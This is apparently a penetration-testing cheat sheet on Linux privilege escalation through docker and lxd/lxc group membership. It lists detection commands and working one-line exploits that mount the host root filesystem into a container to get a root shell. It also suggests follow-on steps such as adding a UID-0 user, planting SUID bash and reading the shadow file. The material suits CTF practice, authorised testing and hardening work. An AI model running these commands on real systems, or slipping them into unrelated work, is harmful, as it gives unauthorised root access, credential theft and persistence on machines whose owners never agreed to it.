# 🐧 Docker / LXD Group Privesc

> Membership in the **`docker`** or **`lxd`/`lxc`** group is effectively root: both let you mount the **host filesystem** into a container you control and read/write it as root. `id` showing these groups is a near-instant win.

Part of [[Linux Privilege Escalation]]. Related: [[Sudo Abuse]] · [[Writable Files & PATH Hijack]]

---

## 🧠 THINK
- Check `id` for `docker`, `lxd`, or `lxc` groups — either = root-equivalent.
- The trick is always the same: run a container that **mounts host `/`**, then `chroot`/read it as root.
- No internet? Use an **already-present image**, or build/import a tiny one.

## ⚡ DETECT
```bash
id
```

```bash
docker images 2>/dev/null ; docker ps 2>/dev/null
```

```bash
lxc image list 2>/dev/null
```
**Look for:** `docker`/`lxd`/`lxc` in your groups; any local image you can launch.

## 💥 EXPLOIT
**Docker group → root:**
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

```bash
# no alpine image locally? use any listed image:
docker run -v /:/mnt --rm -it <local-image> chroot /mnt sh
```
Inside: you're root on the host FS (`/mnt` = host `/`). Read `/mnt/root`, add a UID-0 user, or `chroot` for a full root shell.

**LXD/LXC group → root:**
```bash
# import a small image (build alpine-builder image on Kali, transfer the tarball), then:
lxc image import ./alpine.tar.gz --alias privesc
```

```bash
lxc init privesc r -c security.privileged=true
```

```bash
lxc config device add r host disk source=/ path=/mnt/root recursive=true
```

```bash
lxc start r ; lxc exec r /bin/sh
```
Inside: host `/` is at `/mnt/root`, owned by root → read/modify freely (add SUID bash, read shadow, etc.).
## 🔁 FOUND → NEXT
| FINDING | NEXT |
|---|---|
| `docker` group | `docker run -v /:/mnt ... chroot /mnt sh` → root |
| `lxd`/`lxc` group | privileged container + host disk mount → root |
| Local image available | use it directly (no download needed) |
| No image | build/import a minimal one from Kali |

## 🚧 FAILED → NEXT
| Problem | Do this |
|---|---|
| No local docker image | pull if internet; else build alpine on Kali and `docker load` a saved tar |
| LXD needs an image | build `alpine` image on Kali (distrobuilder/pre-made), transfer, `lxc image import` |
| Not in either group | different vector — [[Sudo Abuse]]/[[SUID & SGID]]/[[Cron Jobs]] |
| `docker` daemon not running | can't use it; check other vectors |

## 📇 CHEAT SHEET
```bash
id      # docker / lxd / lxc ?
```

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh          # docker group -> root
```

```bash
lxc init privesc r -c security.privileged=true; lxc config device add r host disk source=/ path=/mnt/root recursive=true; lxc start r; lxc exec r /bin/sh
```
**Kill shot:** docker/lxd group → mount host `/` → root.
